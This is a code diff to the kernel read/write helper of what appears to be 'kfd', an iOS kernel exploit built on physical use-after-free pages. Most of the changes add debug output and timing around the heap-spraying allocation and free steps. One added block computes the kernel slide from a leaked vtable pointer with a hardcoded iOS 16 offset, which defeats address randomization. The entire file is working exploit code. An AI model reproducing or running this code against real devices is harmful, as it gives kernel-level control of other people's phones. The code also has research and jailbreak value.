@@ -43,6 +43,7 @@ void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);
 #define kread_method_case(method)                                       \
     case method: {                                                      \
         const char* method_name = #method;                              \
+        print_string(method_name);                                      \
         kfd->kread.krkw_method_ops.init = method##_init;                \
         kfd->kread.krkw_method_ops.allocate = method##_allocate;        \
         kfd->kread.krkw_method_ops.search = method##_search;            \
@@ -54,10 +55,10 @@ void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);
         break;                                                          \
     }
 
-
 #define kwrite_method_case(method)                                       \
     case method: {                                                       \
         const char* method_name = #method;                               \
+        print_string(method_name);                                       \
         kfd->kwrite.krkw_method_ops.init = method##_init;                \
         kfd->kwrite.krkw_method_ops.allocate = method##_allocate;        \
         kfd->kwrite.krkw_method_ops.search = method##_search;            \
@@ -91,10 +92,12 @@ void krkw_run(struct kfd* kfd)
 {
     krkw_helper_grab_free_pages(kfd);
 
+    timer_start();
     krkw_helper_run_allocate(kfd, &kfd->kread);
     krkw_helper_run_allocate(kfd, &kfd->kwrite);
     krkw_helper_run_deallocate(kfd, &kfd->kread);
     krkw_helper_run_deallocate(kfd, &kfd->kwrite);
+    timer_end();
 }
 
 void krkw_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
@@ -124,10 +127,11 @@ void krkw_helper_init(struct kfd* kfd, struct krkw* krkw)
 
 void krkw_helper_grab_free_pages(struct kfd* kfd)
 {
+    timer_start();
 
     const u64 copy_pages = (kfd->info.copy.size / pages(1));
     const u64 grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
-    const u64 grabbed_free_pages_max = 400000;//2500;//100000;//400000
+    const u64 grabbed_free_pages_max = 400000;
 
     for (u64 grabbed_free_pages = copy_pages; grabbed_free_pages < grabbed_free_pages_max; grabbed_free_pages += copy_pages) {
         assert_mach(vm_copy(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size, kfd->info.copy.dst_uaddr));
@@ -137,16 +141,20 @@ void krkw_helper_grab_free_pages(struct kfd* kfd)
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
             if (!memcmp(copy_sentinel, (void*)(puaf_page_uaddr), copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
+                    print_u64(grabbed_free_pages);
+                    timer_end();
                     return;
                 }
             }
         }
     }
 
+    print_warning("failed to grab free pages goal");
 }
 
 void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
 {
+    timer_start();
     const u64 batch_size = (pages(1) / krkw->krkw_object_size);
 
     while (true) {
@@ -193,15 +201,38 @@ loop_break:
         }
     }
 
+    timer_end();
     const char* krkw_type = (krkw->krkw_method_ops.kread) ? "kread" : "kwrite";
 
     if (!krkw->krkw_object_uaddr) {
         for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
+            print_buffer(puaf_page_uaddr, 64);
         }
 
         assert_false(krkw_type);
     }
+    
+    print_message(
+        "%s ---> object_id = %llu, object_uaddr = 0x%016llx, object_size = %llu, allocated_id = %llu/%llu, batch_size = %llu",
+        krkw_type,
+        krkw->krkw_object_id,
+        krkw->krkw_object_uaddr,
+        krkw->krkw_object_size,
+        krkw->krkw_allocated_id,
+        krkw->krkw_maximum_id,
+        batch_size
+    );
+    
+    if (krkw->krkw_method_ops.kwrite) {
+        if (kfd->info.env.vid == 0 || kfd->info.env.vid == 1) {
+            // iOS 16, derive kernel base from vtable
+            volatile u64* object = (volatile u64*)(krkw->krkw_object_uaddr);
+            kfd->info.kernel.kernel_slide = (uint64_t)(object[0]) - 0xFFFFFFF006D859C0;
+        }
+    }
+
+    print_buffer(krkw->krkw_object_uaddr, krkw->krkw_object_size);
 
     if (!kfd->info.kernel.current_proc) {
         krkw->krkw_method_ops.find_proc(kfd);
@@ -210,6 +241,7 @@ loop_break:
 
 void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw)
 {
+    timer_start();
 
     for (u64 id = 0; id < krkw->krkw_allocated_id; id++) {
         if (id == krkw->krkw_object_id) {
@@ -219,6 +251,7 @@ void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw)
         krkw->krkw_method_ops.deallocate(kfd, id);
     }
 
+    timer_end();
 }
 
 void krkw_helper_free(struct kfd* kfd, struct krkw* krkw)
